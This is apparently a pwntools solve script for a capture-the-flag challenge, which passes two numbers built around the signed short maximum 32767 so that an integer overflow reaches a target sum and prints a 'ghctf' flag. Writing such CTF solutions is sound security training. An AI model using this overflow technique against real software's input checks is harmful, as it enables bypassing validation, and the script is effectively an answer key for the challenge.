#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("localhost", 5000)

    return r


def main():
    r = conn()

    r.recvuntil(b"Your target sum is: ")
    target = int(r.recvline().decode().strip())

    MAX_SHORT = 32767

    log.info(f"Target is {target}")

    a = f"{MAX_SHORT}".encode()
    log.info(f"Sending a = {a}")
    r.sendlineafter(b"a = ", a)

    b = f"{MAX_SHORT + target + 2}".encode()
    log.info(f"Sending b = {b}")
    r.sendlineafter(b"b = ", b)


    r.recvuntil(b"ghctf")
    flag = r.clean().decode()

    log.success(f"Flag : {"ghctf" + flag}")

    r.close()


if __name__ == "__main__":
    main()
